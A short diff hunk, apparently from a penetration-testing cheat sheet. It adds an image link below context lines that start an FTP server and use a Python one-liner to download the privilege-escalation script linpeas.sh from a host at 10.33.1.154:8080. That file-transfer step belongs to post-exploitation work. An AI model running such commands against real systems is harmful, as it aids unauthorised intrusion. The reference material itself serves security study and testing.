@@ -175,3 +175,6 @@ python3 -m pyftpdlib -p 21
 ```
 python3 -c "import urllib.request;u = 'http://10.33.1.154:8080/linpeas.sh';urllib.request.urlretrieve(u, 'linpeas.sh')"
 ```
+
+
+![image](https://user-images.githubusercontent.com/5285547/157315084-108bc212-efa1-42f5-9d2c-43c3400c0066.png)
